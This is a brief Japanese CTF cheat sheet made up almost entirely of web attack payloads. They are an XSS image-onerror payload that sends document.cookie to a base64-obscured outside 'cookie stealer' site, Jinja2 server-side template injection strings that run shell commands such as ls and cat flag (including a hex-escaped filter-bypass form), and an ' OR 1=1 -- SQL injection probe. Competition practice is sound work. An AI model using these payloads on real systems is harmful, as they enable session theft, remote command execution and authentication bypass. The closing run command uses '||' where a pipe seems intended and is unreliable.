# CTFチートシート
## 目次
{:toc}

---
## Web問
### XSS
```html:XSS
&lt;img src=x onerror=fetch(atob('aHR0cHM6Ly9tYXNhLWNvb2tpZXMtc3RlYWxlci5wYWdlcy5kZXYv')+?cookie='+document.cookie)&gt;
```
この場合は、僕のサイトにクッキーを送信する。
### SSTI
問題にどこにファイルがあるかわからない時には
```python:ssti_ls
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```
SSTIができる時には、
```python:ssti_payload1
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flags').read()}}
```

使えない文字がある場合
```python:ssti_payload2
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```
この場合はFlagの名前が、**flag**だとする
### SQLインジェクション
まず最初に、**'** や、**"** を試す
エラーを吐いたら、次に、
```mysql:sqlinjection
' OR 1=1 --
```
を試してみる

---
## Crypto問
**https://gchq.github.io/CyberChef/** がいい

---
## おまけ
n回後にmを入力するのを繰り返しするためのコード
```python:n_input
for i in range(100):
  for j in range(200):
    print(1)
  print(2)
```
実行方法:
```python:python
python n_input || 入力を自動化したいもの
```

